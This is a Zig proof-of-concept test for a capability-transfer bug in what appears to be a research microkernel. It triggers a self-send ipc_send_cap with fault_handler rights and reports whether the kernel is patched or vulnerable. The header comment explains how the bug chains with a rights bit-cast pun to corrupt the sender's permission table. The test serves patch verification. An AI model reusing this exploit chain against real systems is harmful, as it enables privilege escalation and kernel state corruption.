// PoC for 5c80fe4: ipc_send(HANDLE_SELF, cap_transfer, fault_handler).
//
// Pre-patch (and current HEAD — see report): a sender holding any rights
// could call ipc_send_cap(HANDLE_SELF, [HANDLE_SELF, fault_handler]) and
// the kernel would walk into the HANDLE_SELF fault_handler arm of
// transferCapability with target_proc == sender_proc. This composes with
// the slot-0 rights pun in validateIpcSendRights (ProcessRights bit-cast
// as ProcessHandleRights — spawn_thread/mem_reserve masquerade as
// send_words/send_process) and the now-fixed early break in
// removeThreadHandle to corrupt the sender's own perm table by inserting
// a duplicate ThreadHandle slot for every live sender thread.
//
// Post-patch: validateIpcSendRights blocks self-send + cap_transfer, AND
// transferCapability rejects target_proc == sender_proc in the
// HANDLE_SELF arm — both return E_INVAL.
//
// Differential: rc of ipc_send_cap. Pre-patch: E_OK. Post-patch: E_INVAL.
// We run as the root service (no child needed) — root holds all rights so
// the slot-0 rights gates pass and the only thing under test is the two
// HANDLE_SELF self-send checks the patch added.

const lib = @import("lib");
const syscall = lib.syscall;
const perms = lib.perms;

fn receiverThread() void {
    var msg: syscall.IpcMessage = .{};
    _ = syscall.ipc_recv(true, &msg);
    syscall.thread_exit();
}

pub fn main(_: u64) void {
    // Spawn a sibling thread that parks itself in ipc_recv on the same
    // process's msg_box so that our subsequent ipc_send_cap to HANDLE_SELF
    // finds a receiver and actually walks into validateIpcSendRights +
    // transferCapability (the path the patch hardens). Without a waiting
    // receiver, sysIpcSend short-circuits with E_AGAIN before any of the
    // patched checks ever run.
    const tr = syscall.thread_create(&receiverThread, 0, 4);
    if (tr < 0) {
        syscall.write("POC-5c80fe4: thread_create failed\n");
        syscall.shutdown();
    }

    // Yield until the sibling has reached its blocking ipc_recv.
    var i: usize = 0;
    while (i < 8) {
        syscall.thread_yield();
        i += 1;
    }

    // Cap payload format expected by getCapPayload: last two words of the
    // message are { handle, rights }. We use cap_transfer with a 2-word
    // payload, so word_count==2 → cap.handle = words[0], cap.rights = words[1].
    const cap_handle: u64 = 0; // HANDLE_SELF
    const cap_rights: u64 = (perms.ProcessHandleRights{
        .send_words = true,
        .fault_handler = true,
    }).bits();

    const rc = syscall.ipc_send_cap(0, &.{ cap_handle, cap_rights });

    // Tag rc by writing a single ASCII digit so we can disambiguate when
    // looking at the serial log without a number formatter in libz.
    var tag_buf: [3]u8 = .{ '[', '?', ']' };
    tag_buf[1] = switch (rc) {
        syscall.E_OK => '0',
        syscall.E_INVAL => '1',
        syscall.E_PERM => '2',
        syscall.E_BADHANDLE => '3',
        syscall.E_MAXCAP => '5',
        else => '?',
    };
    syscall.write("POC-5c80fe4 rc");
    syscall.write(&tag_buf);
    syscall.write("\n");

    if (rc == syscall.E_INVAL) {
        syscall.write("POC-5c80fe4: PATCHED (self cap_transfer rejected, E_INVAL)\n");
    } else if (rc == syscall.E_OK) {
        syscall.write("POC-5c80fe4: VULNERABLE (self cap_transfer accepted, E_OK)\n");
    } else {
        syscall.write("POC-5c80fe4: VULNERABLE (cap_transfer not gated by patch checks)\n");
    }
    syscall.shutdown();
}
